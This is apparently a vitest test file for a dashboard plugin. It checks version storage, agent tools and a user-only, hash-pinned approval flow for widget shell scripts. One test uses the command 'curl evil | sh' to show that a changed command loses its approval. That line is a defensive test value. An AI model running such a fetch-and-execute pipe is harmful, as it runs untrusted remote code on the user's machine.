import { describe, expect, it } from "vitest";
import { dashboardHost, memoryStore } from "../test/host";
import { applyOps } from "../ops";
import { EMPTY_LAYOUTS, LIMITS } from "../shared";

type View = { id: string; updatedAt: number; widgets: { id: string; type: string; script: { sha256: string; approved: boolean } | null }[]; data: { widgetId: string; status: string; value: unknown }[] };

async function withHost<T>(work: (host: ReturnType<typeof dashboardHost>) => Promise<T>, options: Parameters<typeof dashboardHost>[0] = {}) {
  const host = dashboardHost(options);
  try {
    return await work(host);
  } finally {
    await host.harness.lifecycle.dispose();
  }
}

const call = (host: ReturnType<typeof dashboardHost>, method: string, input: unknown) => host.harness.behavior.callRpc(method, input) as Promise<any>;
const tool = (host: ReturnType<typeof dashboardHost>, name: string, input: unknown) => host.harness.behavior.callAgentTool(name, input);
const clock = { now: 1_700_000_000_000 };
type Prompt = { nonce: string; command: string; cwd: string; cwdIsHome: boolean; host: string; intervalSec: number; proposedBy: { actor: string; threadId: string | null } | null };
const openDialog = async (host: ReturnType<typeof dashboardHost>, id: string, widgetId: string) => (await call(host, "dashboards.requestApproval", { id, widgetId })).prompt as Prompt;
/** What the dialog does: open, wait a moment, Approve. */
async function approve(host: ReturnType<typeof dashboardHost>, id: string, widgetId: string, sha256: string) {
  const prompt = await openDialog(host, id, widgetId);
  clock.now += 1000;
  await call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce });
}
const text = (result: unknown) => (typeof result === "string" ? result : JSON.stringify(result));

describe("storage", () => {
  it("keeps the last 20 versions, one per burst of edits", () => {
    let clock = 1_000_000;
    const { store } = memoryStore(() => clock);
    const row = store.create({ name: "Ops", by: "user" });
    let n = 0;
    const ctx = { newId: () => `w${++n}`, hasType: () => false };
    let doc = { widgets: [], layouts: EMPTY_LAYOUTS } as Parameters<typeof applyOps>[0];
    for (let i = 0; i < 30; i++) {
      doc = applyOps(doc, [{ op: "add", type: "clock" }], ctx).doc;
      store.write(row.id, doc, "user", "Add widget");
      clock += 10_000;
    }
    // 30 edits 10 s apart: a version per minute.
    expect(store.versions(row.id).length).toBe(5);
    for (let i = 0; i < 30; i++) {
      clock += 120_000;
      store.write(row.id, doc, i % 2 ? "user" : "agent", "Edit");
    }
    expect(store.versions(row.id)).toHaveLength(LIMITS.versions);
  });

  it("deletes a dashboard's widgets, layouts, data, approvals and versions with it", () => {
    const { db, store } = memoryStore();
    const row = store.create({ name: "Gone", by: "user" });
    const doc = applyOps({ widgets: [], layouts: EMPTY_LAYOUTS }, [{ op: "add", type: "stat" }], { newId: () => "w1", hasType: () => false }).doc;
    store.write(row.id, doc, "user", "x");
    store.setValue(row.id, "w1", 5);
    store.approve(row.id, "w1", "a".repeat(64), "echo", null);
    store.propose(row.id, "w1", "a".repeat(64), "agent", null);
    store.delete(row.id);
    for (const table of ["dashboard_widgets", "dashboard_layouts", "dashboard_data", "dashboard_script_approvals", "dashboard_script_proposals", "dashboard_versions"]) {
      expect((db.prepare(`SELECT COUNT(*) AS n FROM ${table}`).get() as { n: number }).n).toBe(0);
    }
  });

  it("migrates as one statement appended to Studio's", async () => {
    const { MIGRATIONS } = await import("../../migrations");
    expect(MIGRATIONS.filter((statement) => statement.includes("CREATE TABLE dashboards ("))).toHaveLength(1);
  });
});

describe("agent tools", () => {
  it("creates a dashboard with widgets and reads it back with ids and data", () => withHost(async (host) => {
    const created = text(await tool(host, "dashboard_create", { name: "Launch", widgets: [
      { type: "stat", title: "Signups", source: { kind: "static", data: { value: 120, delta: "+12%" } } },
      { type: "list", title: "News" },
    ] }));
    expect(created).toMatch(/Created dashboard "Launch" \(id dsh_[0-9a-f]{16}\)/);
    const id = /id (dsh_[0-9a-f]{16})/.exec(created)![1]!;
    expect(text(await tool(host, "dashboard_list", {}))).toContain(`Launch (id ${id}) — 2 widget(s)`);
    const read = text(await tool(host, "dashboard_read", { dashboardId: id }));
    expect(read).toMatch(/- w_[0-9a-f]{12} stat "Signups" at 0,0 3×3; static data; value \{"value":120,"delta":"\+12%"\}/);
    expect(read).toMatch(/list "News" .* push \(widget_set_data\); no data yet/);
    expect(read).toContain("Widgets JSON:");
  }));

  it("edits atomically and rejects bad input with a reason", () => withHost(async (host) => {
    const { dashboard } = await call(host, "dashboards.create", { name: "X" });
    const bad = await tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "add", type: "note" }, { op: "remove", widgetId: "nope" }] }) as { isError?: boolean; content: { text: string }[] };
    expect(bad.isError).toBe(true);
    expect(bad.content[0]!.text).toMatch(/Nothing changed: Op 2/);
    expect((await call(host, "dashboards.get", { id: dashboard.id })).dashboard.widgets).toEqual([]);
    await expect(tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "add", type: "nonsense" }] })).rejects.toThrow();
  }));

  it("pushes data only to push widgets, within the cap", () => withHost(async (host) => {
    const { dashboard } = await call(host, "dashboards.create", { name: "X" });
    const { dashboard: view } = await call(host, "dashboards.edit", { id: dashboard.id, ops: [{ op: "add", type: "stat" }, { op: "add", type: "stat", source: { kind: "static", data: 1 } }] }) as { dashboard: View };
    const [push, fixed] = view.widgets;
    expect(text(await tool(host, "widget_set_data", { dashboardId: dashboard.id, widgetId: push!.id, data: [1, 2, 3] }))).toContain("Set data");
    expect(text(await tool(host, "widget_set_data", { dashboardId: dashboard.id, widgetId: fixed!.id, data: 2 }))).toMatch(/static source/);
    expect(text(await tool(host, "widget_set_data", { dashboardId: dashboard.id, widgetId: push!.id, data: "x".repeat(LIMITS.pushBytes) }))).toMatch(/over 512 KB/);
    const after = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
    expect(after.data.find((each) => each.widgetId === push!.id)).toMatchObject({ status: "ok", value: [1, 2, 3] });
  }));

  it("lets an agent propose a script but only the user approve it, pinned by hash", () => withHost(async (host) => {
    const { dashboard } = await call(host, "dashboards.create", { name: "X" });
    const proposed = text(await tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "add", type: "stat", source: { kind: "script", command: "echo 1" } }] }));
    expect(proposed).toMatch(/wait for the user to approve/);
    await expect(tool(host, "dashboard_approve", {})).rejects.toThrow();
    let view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
    const widget = view.widgets[0]!;
    expect(widget.script).toMatchObject({ approved: false });
    expect(view.data[0]).toMatchObject({ status: "approval" });
    await call(host, "dashboards.view", { id: dashboard.id, clientId: "c1" });
    const prompt = await openDialog(host, dashboard.id, widget.id);
    expect(prompt).toMatchObject({ command: "echo 1", cwdIsHome: true, intervalSec: 900, timeoutSec: 30, maxOutputBytes: 1024 * 1024, proposedBy: { actor: "agent", threadTitle: "Ops dashboard" } });
    expect(prompt.host).toBeTruthy();
    clock.now += 1000;
    await expect(call(host, "dashboards.approveScript", { id: dashboard.id, widgetId: widget.id, sha256: "0".repeat(64), nonce: prompt.nonce })).rejects.toThrow(/command changed/);
    await approve(host, dashboard.id, widget.id, widget.script!.sha256);
    view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
    expect(view.widgets[0]!.script).toMatchObject({ approved: true });
    // The agent renames it: still approved. It changes the command: approval is gone.
    await tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "update", widgetId: widget.id, title: "Count" }] });
    expect(((await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View).widgets[0]!.script).toMatchObject({ approved: true });
    await tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "update", widgetId: widget.id, source: { kind: "script", command: "curl evil | sh" } }] });
    view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
    expect(view.widgets[0]!.script).toMatchObject({ approved: false });
    expect(view.widgets[0]!.script!.sha256).not.toBe(widget.script!.sha256);
  }, { now: () => clock.now }));
});

describe("script approval", () => {
  async function scripted(host: ReturnType<typeof dashboardHost>) {
    const { dashboard } = await call(host, "dashboards.create", { name: "X" });
    await tool(host, "dashboard_edit", { dashboardId: dashboard.id, ops: [{ op: "add", type: "stat", source: { kind: "script", command: "echo 1", cwd: "/tmp", intervalSec: 300 } }] });
    const view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
    await call(host, "dashboards.view", { id: dashboard.id, clientId: "c1" });
    return { id: dashboard.id as string, widgetId: view.widgets[0]!.id, sha256: view.widgets[0]!.script!.sha256 };
  }
  const approved = async (host: ReturnType<typeof dashboardHost>, id: string) => ((await call(host, "dashboards.get", { id })).dashboard as View).widgets[0]!.script!.approved;

  it("approves a command once for every widget on the dashboard that runs it", () => withHost(async (host) => {
    const { id, widgetId, sha256 } = await scripted(host);
    const same = { kind: "script", command: "echo 1", cwd: "/tmp", intervalSec: 300 };
    await tool(host, "dashboard_edit", { dashboardId: id, ops: [
      { op: "add", type: "stat", source: { ...same, select: "a" } },
      { op: "add", type: "stat", source: { ...same, command: "echo 2" } },
    ] });
    const other = (await call(host, "dashboards.create", { name: "Y" })).dashboard.id as string;
    await tool(host, "dashboard_edit", { dashboardId: other, ops: [{ op: "add", type: "stat", source: same }] });
    const states = async (dashboardId: string) => ((await call(host, "dashboards.get", { id: dashboardId })).dashboard as View).widgets.map((widget) => widget.script!.approved);
    await approve(host, id, widgetId, sha256);
    // Same command and folder: approved; a different command or another dashboard: not.
    expect(await states(id)).toEqual([true, true, false]);
    expect(await states(other)).toEqual([false]);
    // Revoking it from any of them stops all of them.
    const second = ((await call(host, "dashboards.get", { id })).dashboard as View).widgets[1]!.id;
    await call(host, "dashboards.revokeScript", { id, widgetId: second });
    expect(await states(id)).toEqual([false, false, false]);
  }, { now: () => clock.now }));

  it("refuses a direct approve without the dialog's nonce", () => withHost(async (host) => {
    const { id, widgetId, sha256 } = await scripted(host);
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256 })).rejects.toThrow();
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: "x".repeat(43) })).rejects.toThrow(/approval dialog/);
    expect(await approved(host, id)).toBe(false);
  }, { now: () => clock.now }));

  it("refuses other plugins, and agents have no way in", () => withHost(async (host) => {
    const { id, widgetId, sha256 } = await scripted(host);
    const asPlugin = { experimental_caller: { kind: "plugin" as const, pluginId: "other" } };
    await expect(host.harness.behavior.callRpc("dashboards.requestApproval", { id, widgetId }, asPlugin)).rejects.toThrow(/Only the user/);
    const prompt = await openDialog(host, id, widgetId);
    clock.now += 1000;
    await expect(host.harness.behavior.callRpc("dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce }, asPlugin)).rejects.toThrow(/Only the user/);
    for (const name of ["dashboard_approve", "dashboard_approve_script", "widget_approve"]) await expect(tool(host, name, { dashboardId: id, widgetId })).rejects.toThrow();
    expect(await approved(host, id)).toBe(false);
  }, { now: () => clock.now }));

  it("needs a BB window showing the dashboard to open the dialog", () => withHost(async (host) => {
    const { id, widgetId } = await scripted(host);
    await call(host, "dashboards.view", { id, clientId: "c1", leave: true });
    await expect(call(host, "dashboards.requestApproval", { id, widgetId })).rejects.toThrow(/Open the dashboard/);
  }, { now: () => clock.now }));

  it("accepts a nonce once, and not in the dialog's first moment", () => withHost(async (host) => {
    const { id, widgetId, sha256 } = await scripted(host);
    const prompt = await openDialog(host, id, widgetId);
    expect(prompt).toMatchObject({ cwd: "/tmp", cwdIsHome: false, intervalSec: 300 });
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce })).rejects.toThrow(/Read the command first/);
    clock.now += 1000;
    await call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce });
    expect(await approved(host, id)).toBe(true);
    await call(host, "dashboards.revokeScript", { id, widgetId });
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce })).rejects.toThrow(/approval dialog/);
    expect(await approved(host, id)).toBe(false);
  }, { now: () => clock.now }));

  it("invalidates the nonce on any edit, on Deny, on a newer dialog and after 5 minutes", () => withHost(async (host) => {
    const { id, widgetId, sha256 } = await scripted(host);
    // Any edit, even a title, while the dialog is open.
    let prompt = await openDialog(host, id, widgetId);
    clock.now += 1000;
    await tool(host, "dashboard_edit", { dashboardId: id, ops: [{ op: "update", widgetId, title: "Renamed" }] });
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce })).rejects.toThrow(/dashboard changed/);
    // Deny.
    prompt = await openDialog(host, id, widgetId);
    clock.now += 1000;
    await call(host, "dashboards.cancelApproval", { nonce: prompt.nonce });
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: prompt.nonce })).rejects.toThrow(/approval dialog/);
    // A newer dialog replaces the older one.
    const older = await openDialog(host, id, widgetId);
    const newer = await openDialog(host, id, widgetId);
    clock.now += 1000;
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: older.nonce })).rejects.toThrow(/approval dialog/);
    // Expiry.
    clock.now += 5 * 60_000;
    await expect(call(host, "dashboards.approveScript", { id, widgetId, sha256, nonce: newer.nonce })).rejects.toThrow(/expired/);
    // A nonce is for its widget and dashboard only.
    const { dashboard: other } = await call(host, "dashboards.create", { name: "Y" });
    await call(host, "dashboards.view", { id, clientId: "c1" });
    prompt = await openDialog(host, id, widgetId);
    clock.now += 1000;
    await expect(call(host, "dashboards.approveScript", { id: other.id, widgetId, sha256, nonce: prompt.nonce })).rejects.toThrow();
    expect(await approved(host, id)).toBe(false);
  }, { now: () => clock.now }));

  it("names who proposed the command", () => withHost(async (host) => {
    const { dashboard } = await call(host, "dashboards.create", { name: "X" });
    await call(host, "dashboards.edit", { id: dashboard.id, ops: [{ op: "add", type: "stat", source: { kind: "script", command: "date" } }] });
    const widgetId = ((await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View).widgets[0]!.id;
    await call(host, "dashboards.view", { id: dashboard.id, clientId: "c1" });
    expect((await openDialog(host, dashboard.id, widgetId)).proposedBy).toMatchObject({ actor: "user", threadId: null });
  }, { now: () => clock.now }));
});

describe("library widgets", () => {
  it("defines a library widget and uses it", () => withHost(async (host) => {
    const defined = text(await tool(host, "widget_define", { name: "Gauge", html: "<div id=g></div><script>addEventListener('bbwidget', e => g.textContent = e.detail.data)</script>" }));
    const typeId = /id (wt_[0-9a-f]{16})/.exec(defined)![1]!;
    const created = text(await tool(host, "dashboard_create", { name: "Custom", widgets: [{ type: "custom", customType: typeId, source: { kind: "static", data: 42 } }] }));
    const id = /id (dsh_[0-9a-f]{16})/.exec(created)![1]!;
    const view = (await call(host, "dashboards.get", { id })).dashboard as View & { widgetTypes: { id: string; html: string }[] };
    expect(view.widgetTypes.map((type) => type.id)).toEqual([typeId]);
    await expect(call(host, "dashboards.deleteWidgetType", { id: typeId })).rejects.toThrow(/use this type/);
  }));
});

describe("url widgets", () => {
  it("fetch through the server when the dashboard opens, keeping time and error", () => withHost(async (host) => {
    const { dashboard } = await call(host, "dashboards.create", { name: "Feeds" });
    await call(host, "dashboards.edit", { id: dashboard.id, ops: [{ op: "add", type: "stat", source: { kind: "url", url: "https://api.example/stats", select: "users" } }] });
    // The add starts a fetch; wait for it.
    for (let i = 0; i < 20; i++) {
      const view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View;
      if (view.data[0]!.status !== "pending") break;
      await new Promise((resolve) => setTimeout(resolve, 10));
    }
    const view = (await call(host, "dashboards.get", { id: dashboard.id })).dashboard as View & { data: { fetchedAt: number | null }[] };
    expect(view.data[0]).toMatchObject({ status: "ok", value: 42 });
    expect(view.data[0]!.fetchedAt).toBeGreaterThan(0);
  }, { fetch: (async () => new Response(JSON.stringify({ users: 42 }), { headers: { "content-type": "application/json" } })) as typeof fetch }));
});
